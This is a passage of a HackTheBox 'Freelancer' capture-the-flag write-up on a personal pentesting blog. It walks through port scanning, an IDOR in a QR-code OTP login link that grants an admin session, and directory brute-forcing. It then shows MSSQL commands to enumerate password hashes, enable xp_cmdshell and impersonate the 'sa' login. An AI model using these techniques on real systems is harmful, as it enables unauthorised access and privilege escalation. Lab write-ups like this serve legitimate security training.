<!doctype html><html lang=en><head><title>HTB Freelancer WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="HackTheBox 'Freelancer' WriteUp"><meta name=keywords content="blog,pentesting,hacking,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="HTB Freelancer WriteUp"><meta name=twitter:description content="HackTheBox 'Freelancer' WriteUp"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/posts/freelancer/"><meta property="og:site_name" content="gunzf0x"><meta property="og:title" content="HTB Freelancer WriteUp"><meta property="og:description" content="HackTheBox 'Freelancer' WriteUp"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-10-05T00:00:00+00:00"><meta property="article:modified_time" content="2024-10-05T00:00:00+00:00"><meta property="article:tag" content="HTB"><meta property="article:tag" content="Machine"><meta property="article:tag" content="Windows"><meta property="article:tag" content="Hard"><meta property="article:tag" content="Pivoting"><meta property="article:tag" content="Cmd"><link rel=canonical href=https://gunzf0x.github.io/pentesting/posts/freelancer/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.b587cb1f00f2309d3943f06d512873c8c174188c45cb8406de0bfe6523023297.css integrity="sha256-tYfLHwDyMJ05Q/BtUShzyMF0GIxFy4QG3gv+ZSMCMpc=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/projects/>Projects</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/contact/>Contact me</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/es/posts/freelancer/>üá®üá±</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/posts/freelancer/>HTB Freelancer WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-10-05T00:00:00Z>5 October, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
22-minute read</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/tags/htb/>HTB</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/machine/>Machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/windows/>Windows</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/hard/>Hard</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/pivoting/>Pivoting</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/cmd/>Cmd</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/netcat/>Netcat</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/runascs/>Runascs</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/bloodhound/>Bloodhound</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/rbcd/>Rbcd</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/addcomputer/>Addcomputer</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/getst/>GetST</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/secretsdump/>Secretsdump</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/netexec/>Netexec</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/idor/>Idor</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/mssql/>Mssql</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/vhost/>Vhost</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/ffuf/>Ffuf</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/powershell/>Powershell</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/impacket/>Impacket</a></span></div></div></header><div class=post-content><h1 id=freelancer----hackthebox>Freelancer &ndash; HackTheBox
<a class=heading-link href=#freelancer----hackthebox><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Windows</em></li><li>Difficulty: <em>Hard</em></li><li>Platform: <em>HackTheBox</em></li></ul><p><img alt="&lsquo;Freelancer&rsquo; Avatar" src=/pentesting/images/Freelancer_avatar.png></p><hr><h2 id=summary>Summary
<a class=heading-link href=#summary><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>&ldquo;Freelancer&rdquo; is a hard <code>Windows</code> machine from the platform HackTheBox. After performing an initial scan, we are able to visit a webpage where we can create an account and, to log in with this account, change it&rsquo;s password (avoiding the review by &ldquo;administration&rdquo; team). Once inside, we are able to find an <code>IDOR</code> vulnerability in a QR Code that allows us to gain access to a <code>MSSQL</code> panel. We are able to execute commands in this database and gain initial access to the victim machine. Once inside, we are able to find credentials for a new user that has access to backup files. These backup files leak the password of a new user. After inpecting permissions with <code>BloodHound</code>, this final user can be used to perform a <code>Resource-based Constrained Delegation</code> attack. With this attack we are able to get the ticket for <code>Administrator</code> user and gain total control of the victim machine.</p><hr><h2 id=user>User
<a class=heading-link href=#user><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>Starting with <code>Nmap</code> scan shows multiple ports open: <code>53</code> <code>Domain Name System</code> (<code>DNS</code>), <code>80</code> <code>HTTP</code>, <code>88</code> <code>Kerberos</code>, <code>135</code> <code>Microsoft RPC</code>, <code>389</code> <code>Lightweight Directory Access Protocol</code> (<code>LDAP</code>), <code>445</code> <code>Server Message Block</code> (<code>SMB</code>), <code>5985</code> <code>Windows Remote Management</code> (<code>WinRM</code>); among many others.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49669,49670,49671,49672,49675,55136,55140,55297 10.10.11.5 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-09 21:34 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.10.11.5
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.22s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT      STATE SERVICE       VERSION
</span></span></span><span class=line><span class=cl><span class=go>53/tcp    open  domain        Simple DNS Plus
</span></span></span><span class=line><span class=cl><span class=go>80/tcp    open  http          nginx 1.25.5
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Did not follow redirect to http://freelancer.htb/
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: nginx/1.25.5
</span></span></span><span class=line><span class=cl><span class=go>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-10 06:34:02Z)
</span></span></span><span class=line><span class=cl><span class=go>135/tcp   open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
</span></span></span><span class=line><span class=cl><span class=go>389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)
</span></span></span><span class=line><span class=cl><span class=go>445/tcp   open  microsoft-ds?
</span></span></span><span class=line><span class=cl><span class=go>464/tcp   open  kpasswd5?
</span></span></span><span class=line><span class=cl><span class=go>593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span></span><span class=line><span class=cl><span class=go>636/tcp   open  tcpwrapped
</span></span></span><span class=line><span class=cl><span class=go>3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: freelancer.htb0., Site: Default-First-Site-Name)
</span></span></span><span class=line><span class=cl><span class=go>3269/tcp  open  tcpwrapped
</span></span></span><span class=line><span class=cl><span class=go>5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Not Found
</span></span></span><span class=line><span class=cl><span class=go>9389/tcp  open  mc-nmf        .NET Message Framing
</span></span></span><span class=line><span class=cl><span class=go>47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Microsoft-HTTPAPI/2.0
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: Not Found
</span></span></span><span class=line><span class=cl><span class=go>49664/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49665/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49666/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49667/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49669/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
</span></span></span><span class=line><span class=cl><span class=go>49671/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49672/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>49675/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>55136/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>55140/tcp open  msrpc         Microsoft Windows RPC
</span></span></span><span class=line><span class=cl><span class=go>55297/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
</span></span></span><span class=line><span class=cl><span class=go>| ms-sql-info:
</span></span></span><span class=line><span class=cl><span class=go>|   10.10.11.5\SQLEXPRESS:
</span></span></span><span class=line><span class=cl><span class=go>|     Instance name: SQLEXPRESS
</span></span></span><span class=line><span class=cl><span class=go>|     Version:
</span></span></span><span class=line><span class=cl><span class=go>|       name: Microsoft SQL Server 2019 RTM
</span></span></span><span class=line><span class=cl><span class=go>|       number: 15.00.2000.00
</span></span></span><span class=line><span class=cl><span class=go>|       Product: Microsoft SQL Server 2019
</span></span></span><span class=line><span class=cl><span class=go>|       Service pack level: RTM
</span></span></span><span class=line><span class=cl><span class=go>|       Post-SP patches applied: false
</span></span></span><span class=line><span class=cl><span class=go>|     TCP port: 55297
</span></span></span><span class=line><span class=cl><span class=go>|     Named pipe: \\10.10.11.5\pipe\MSSQL$SQLEXPRESS\sql\query
</span></span></span><span class=line><span class=cl><span class=go>|_    Clustered: false
</span></span></span><span class=line><span class=cl><span class=go>| ms-sql-ntlm-info:
</span></span></span><span class=line><span class=cl><span class=go>|   10.10.11.5\SQLEXPRESS:
</span></span></span><span class=line><span class=cl><span class=go>|     Target_Name: FREELANCER
</span></span></span><span class=line><span class=cl><span class=go>|     NetBIOS_Domain_Name: FREELANCER
</span></span></span><span class=line><span class=cl><span class=go>|     NetBIOS_Computer_Name: DC
</span></span></span><span class=line><span class=cl><span class=go>|     DNS_Domain_Name: freelancer.htb
</span></span></span><span class=line><span class=cl><span class=go>|     DNS_Computer_Name: DC.freelancer.htb
</span></span></span><span class=line><span class=cl><span class=go>|     DNS_Tree_Name: freelancer.htb
</span></span></span><span class=line><span class=cl><span class=go>|_    Product_Version: 10.0.17763
</span></span></span><span class=line><span class=cl><span class=go>| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
</span></span></span><span class=line><span class=cl><span class=go>| Not valid before: 2024-06-07T16:05:35
</span></span></span><span class=line><span class=cl><span class=go>|_Not valid after:  2054-06-07T16:05:35
</span></span></span><span class=line><span class=cl><span class=go>|_ssl-date: 2024-06-10T06:35:12+00:00; +4h59m43s from scanner time.
</span></span></span><span class=line><span class=cl><span class=go>Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Host script results:
</span></span></span><span class=line><span class=cl><span class=go>| smb2-time:
</span></span></span><span class=line><span class=cl><span class=go>|   date: 2024-06-10T06:35:04
</span></span></span><span class=line><span class=cl><span class=go>|_  start_date: N/A
</span></span></span><span class=line><span class=cl><span class=go>| smb2-security-mode:
</span></span></span><span class=line><span class=cl><span class=go>|   3:1:1:
</span></span></span><span class=line><span class=cl><span class=go>|_    Message signing enabled and required
</span></span></span><span class=line><span class=cl><span class=go>|_clock-skew: mean: 4h59m42s, deviation: 0s, median: 4h59m42s
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 84.18 seconds
</span></span></span></code></pre></div><p>As we can see from the scan for port <code>80</code> <code>HTTP</code>, we get redirected to <code>http://freelancer.htb</code>, so I add this new domain to my <code>/etc/hosts</code> file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ echo &#39;10.10.11.5 freelancer.htb&#39; | sudo tee -a /etc/hosts
</span></span></span></code></pre></div><p>Once added, we visit <code>http://freelancer.htb</code> and we can see the following site:</p><p><img alt="Freelancer 1" src=/pentesting/images/Freelancer_1.png></p><p>I note that at the top right of the site I can register as <code>Freelancer</code> or as an <code>Employee</code>. Attempting to create an account as an <code>Employee</code> the page redirects to <code>http://freelancer.htb/employer/register</code>, where we can see:</p><p><img alt="Freelancer 3" src=/pentesting/images/Freelancer_3.png></p><p>I create an employee account. Note that the password cannot be the same as the username and cannot be a common one. I also recommend you to remember the answers to &ldquo;personal questions&rdquo; such as &ldquo;the name of your pet&rdquo; and others (we might need them later). Once created, it redirects us to <code>http://freelancer.htb/accounts/login</code>:</p><p><img alt="Freelancer 2" src=/pentesting/images/Freelancer_2.png></p><p>But when I try to log in I get an error:</p><p><img alt="Freelancer 4" src=/pentesting/images/Freelancer_4.png></p><p>At this point we can try to recover our created account. For that just click on <code>Forgot your password?</code> it redirects to <code>http://freelancer.htb/accounts/recovery/</code>, where we can see now:</p><p><img alt="Freelancer 5" src=/pentesting/images/Freelancer_5.png></p><p>Now just add your &ldquo;secrets answers&rdquo; and we can now reset our password:</p><p><img alt="Freelancer 6" src=/pentesting/images/Freelancer_6.png></p><p>Now, we are able to log in with the created account, but with the reseted password in the login panel. Once in we can see:</p><p><img alt="Freelancer 7" src=/pentesting/images/Freelancer_7.png></p><p>At the left side I can see the option <code>QR Code</code>. If we click on it we can see:</p><p><img alt="Freelancer 8" src=/pentesting/images/Freelancer_8.png></p><p>I just search on Google for <code>qr reader online</code> and get <a href=https://webqr.com/index.html class=external-link target=_blank rel=noopener>this page</a>. Once there, we can upload the QR Code clicking on the camera icon. Once uploaded we have:</p><p><img alt="Freelancer 9" src=/pentesting/images/Freelancer_9.png></p><p>I get the link:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>http://freelancer.htb/accounts/login/otp/MTAwMTA=/1886888efac3a20ac0f5b39870424739/
</span></span></code></pre></div><p>An important thing to note is, as the page says, that the QR Code only lasts for 5 minutes. So it might change.
After following the url link from the QR code, apparently it gets back to the account. <em>But it did not ask for any password</em>:</p><p><img alt="Freelancer 10" src=/pentesting/images/Freelancer_10.png></p><p>Now I am able to post jobs. I create a simple job called <code>Pentester</code>. Once created we have in the webpage:
<img alt="Freelancer 11" src=/pentesting/images/Freelancer_11.png></p><p>I note that the url of this new &ldquo;job&rdquo; is <code>http://freelancer.htb/job/details/?job_id=13</code>. If I change the field <code>job_id=13</code> to <code>job_id=12</code> I can see another job:</p><p><img alt="Freelancer 12" src=/pentesting/images/Freelancer_12.png></p><p>but besides other jobs I do not see anything interesting.</p><p>I just check what this parameter <code>MTAwMTA=</code> string was in the <code>QR Code</code>, and apparently it is encoded in base <code>base64</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ echo &#39;MTAwMTA=&#39; | base64 -d
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>10010
</span></span></span></code></pre></div><p>Now, back to the generated <code>QR Code</code> (and after generating a couple of different ones), it seems to follow a pattern:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>http://freelancer.htb/accounts/login/otp/&lt;string&gt;=&lt;generated code&gt;
</span></span></code></pre></div><p>Maybe this <code>&lt;string></code>, that was encoded in <code>base64</code>, is something like an <code>ID</code> parameter and <code>&lt;generated code></code> is a temporal code that changes every X minutes. Assuming there is an <code>administrator</code> user, it should have an <code>ID = 1</code>. If we pass the string <code>1</code> to <code>base64</code> we have:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ echo -n &#39;1&#39; | base64
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>MQ==
</span></span></span></code></pre></div><p>So I do the following:</p><ol><li>Generate a new <code>QR Code</code>.</li><li>Replace in the <code>QR Code</code> the field <code>&lt;string></code> by <code>MQ=</code> with the recently generated code.</li></ol><p>But when I do this I get code <code>500 Internal Server Error</code>
However, if I use as <code>&lt;string></code> (or <code>id</code>) the number <code>2</code>, it works. For example, based on our previous generated link from the <code>QR Code</code>, now we have:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>http://freelancer.htb/accounts/login/otp/Mg==/1886888efac3a20ac0f5b39870424739/
</span></span></code></pre></div><p>where</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ echo -n &#39;2&#39; | base64
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Mg==
</span></span></span></code></pre></div><p>I.e., <code>Mg==</code> is just <code>2</code> encoded and we replace that for the original value <code>MTAwMTA=</code> in the original generated link.</p><p>Once done that, I get a console as <code>admin</code>:</p><p><img alt="Freelancer 13" src=/pentesting/images/Freelancer_13.png></p><p>But this panel seems like just any other panel. I decide to search for directories attempting a <code>Brute Force Directory Listing</code> with <code>ffuf</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -c -u http://freelancer.htb/FUZZ -t 55
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>        /&#39;___\  /&#39;___\           /&#39;___\
</span></span></span><span class=line><span class=cl><span class=go>       /\ \__/ /\ \__/  __  __  /\ \__/
</span></span></span><span class=line><span class=cl><span class=go>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
</span></span></span><span class=line><span class=cl><span class=go>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
</span></span></span><span class=line><span class=cl><span class=go>         \ \_\   \ \_\  \ \____/  \ \_\
</span></span></span><span class=line><span class=cl><span class=go>          \/_/    \/_/   \/___/    \/_/
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>       v2.1.0-dev
</span></span></span><span class=line><span class=cl><span class=go>________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> :: Method           : GET
</span></span></span><span class=line><span class=cl><span class=go> :: URL              : http://freelancer.htb/FUZZ
</span></span></span><span class=line><span class=cl><span class=go> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
</span></span></span><span class=line><span class=cl><span class=go> :: Follow redirects : false
</span></span></span><span class=line><span class=cl><span class=go> :: Calibration      : false
</span></span></span><span class=line><span class=cl><span class=go> :: Timeout          : 10
</span></span></span><span class=line><span class=cl><span class=go> :: Threads          : 55
</span></span></span><span class=line><span class=cl><span class=go> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
</span></span></span><span class=line><span class=cl><span class=go>________________________________________________
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>about                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 303ms]
</span></span></span><span class=line><span class=cl><span class=go>contact                 [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 2141ms]
</span></span></span><span class=line><span class=cl><span class=go>admin                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 694ms]
</span></span></span></code></pre></div><p>And we find the directory <code>/admin</code>. Visiting it redirects to <code>http://freelancer.htb/admin/login/?next=/admin/</code> and shows an admin login panel:</p><p><img alt="Freelancer 14" src=/pentesting/images/Freelancer_14.png></p><p>But if I go, using the session from the logged <code>admin</code> user, to <code>/admin</code>, now it displays the administration panel:</p><p><img alt=Freelancer src=/pentesting/images/Freelancer_15.png></p><p>If I click on <code>SQL Terminal</code> and scroll down, now I can see a terminal. I will try to inject commands based on <a href=https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#common-enumeration class=external-link target=_blank rel=noopener>HackTricks</a>. For example, based on one of the command examples provided we can list the users in the service running:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>select</span><span class=w> </span><span class=n>sp</span><span class=p>.</span><span class=n>name</span><span class=w> </span><span class=k>as</span><span class=w> </span><span class=n>login</span><span class=p>,</span><span class=w> </span><span class=n>sp</span><span class=p>.</span><span class=n>type_desc</span><span class=w> </span><span class=k>as</span><span class=w> </span><span class=n>login_type</span><span class=p>,</span><span class=w> </span><span class=n>sl</span><span class=p>.</span><span class=n>password_hash</span><span class=p>,</span><span class=w> </span><span class=n>sp</span><span class=p>.</span><span class=n>create_date</span><span class=p>,</span><span class=w> </span><span class=n>sp</span><span class=p>.</span><span class=n>modify_date</span><span class=p>,</span><span class=w> </span><span class=k>case</span><span class=w> </span><span class=k>when</span><span class=w> </span><span class=n>sp</span><span class=p>.</span><span class=n>is_disabled</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=mi>1</span><span class=w> </span><span class=k>then</span><span class=w> </span><span class=s1>&#39;Disabled&#39;</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=s1>&#39;Enabled&#39;</span><span class=w> </span><span class=k>end</span><span class=w> </span><span class=k>as</span><span class=w> </span><span class=n>status</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>sys</span><span class=p>.</span><span class=n>server_principals</span><span class=w> </span><span class=n>sp</span><span class=w> </span><span class=k>left</span><span class=w> </span><span class=k>join</span><span class=w> </span><span class=n>sys</span><span class=p>.</span><span class=n>sql_logins</span><span class=w> </span><span class=n>sl</span><span class=w> </span><span class=k>on</span><span class=w> </span><span class=n>sp</span><span class=p>.</span><span class=n>principal_id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>sl</span><span class=p>.</span><span class=n>principal_id</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=n>sp</span><span class=p>.</span><span class=k>type</span><span class=w> </span><span class=k>not</span><span class=w> </span><span class=k>in</span><span class=w> </span><span class=p>(</span><span class=s1>&#39;G&#39;</span><span class=p>,</span><span class=w> </span><span class=s1>&#39;R&#39;</span><span class=p>)</span><span class=w> </span><span class=k>order</span><span class=w> </span><span class=k>by</span><span class=w> </span><span class=n>sp</span><span class=p>.</span><span class=n>name</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></div><p>which returns:</p><p><img alt="Freelancer 17" src=/pentesting/images/Freelancer_17.png></p><p>But if I try to execute system commands, like <code>whoami</code> running:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>EXEC</span><span class=w> </span><span class=n>master</span><span class=p>..</span><span class=n>xp_cmdshell</span><span class=w> </span><span class=s1>&#39;whoami&#39;</span><span class=w>
</span></span></span></code></pre></div><p>I get an error:</p><p><img alt="Freelancer 18" src=/pentesting/images/Freelancer_18.png></p><p>which basically says that we do not have permissions to execute commands.</p><p>If I use the oneliner from <a href=https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#execute-os-commands class=external-link target=_blank rel=noopener>HackTricks</a> attempting to enable our user to execute commands with the command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>EXEC</span><span class=w> </span><span class=n>sp_configure</span><span class=w> </span><span class=s1>&#39;Show Advanced Options&#39;</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>;</span><span class=w> </span><span class=n>RECONFIGURE</span><span class=p>;</span><span class=w> </span><span class=k>EXEC</span><span class=w> </span><span class=n>sp_configure</span><span class=w> </span><span class=s1>&#39;xp_cmdshell&#39;</span><span class=p>,</span><span class=w> </span><span class=mi>1</span><span class=p>;</span><span class=w> </span><span class=n>RECONFIGURE</span><span class=p>;</span><span class=w>
</span></span></span></code></pre></div><p>we get a similar error.</p><p>When we enumerated user we saw 2 users available: <code>Freelancer_webapp_user</code> and <code>sa</code>. If I check which user are we currently logged in as with the command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=n>user_name</span><span class=p>();</span><span class=w>
</span></span></span></code></pre></div><p>I get:</p><p><img alt="Freelancer 19" src=/pentesting/images/Freelancer_19.png></p><p>so we are currently logged in as <code>Freelancer_webapp_user</code>.</p><p>Following again <a href=https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#from-db_owner-to-sysadmin class=external-link target=_blank rel=noopener>HackTricks</a>, we could try to pass from database owner user (<code>Freelancer_webapp_user</code>) to <code>sysadmin</code> user (<code>sa</code>). If I check the owners of the databases with the command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>SELECT</span><span class=w> </span><span class=n>suser_sname</span><span class=p>(</span><span class=n>owner_sid</span><span class=p>)</span><span class=w> </span><span class=k>FROM</span><span class=w> </span><span class=n>sys</span><span class=p>.</span><span class=n>databases</span><span class=w>
</span></span></span></code></pre></div><p>I get that <code>sa</code> is the owner of all the databases.
If I execute the commands:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=k>EXECUTE</span><span class=w> </span><span class=k>AS</span><span class=w> </span><span class=n>LOGIN</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;sa&#39;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=k>SELECT</span><span class=w> </span><span class=n>IS_SRVROLEMEMBER</span><span class=p>(</span><span class=s1>&#39;sysadmin&#39;</span><span class=p>)</span><span class=w>
